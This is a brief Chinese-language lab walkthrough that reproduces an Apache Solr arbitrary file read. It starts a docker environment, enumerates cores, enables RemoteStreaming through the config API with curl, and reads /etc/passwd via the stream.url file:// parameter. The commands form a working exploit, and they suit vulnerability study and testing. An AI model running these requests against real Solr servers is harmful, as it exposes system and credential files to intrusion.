开启环境：
```
docker compose up -d
```
访问页面：
```
http://localhost:8983
```

获取数据库名：
```
http://localhost:8983/solr/admin/cores?indexInfo=false&wt=json
```
数据库名为demo

发送请求修改demo核心的配置并启用`RemoeStreaming`:
```
curl -i -s -k -X $'POST' -H $'Content-Type: application/json' --data-binary $'{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' $'http://localhost:8983/solr/demo/config'
```
通过`stream.url`参数读取任意文件：
```
curl -i -s -k 'http://localhost:8983/solr/demo/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd'
```



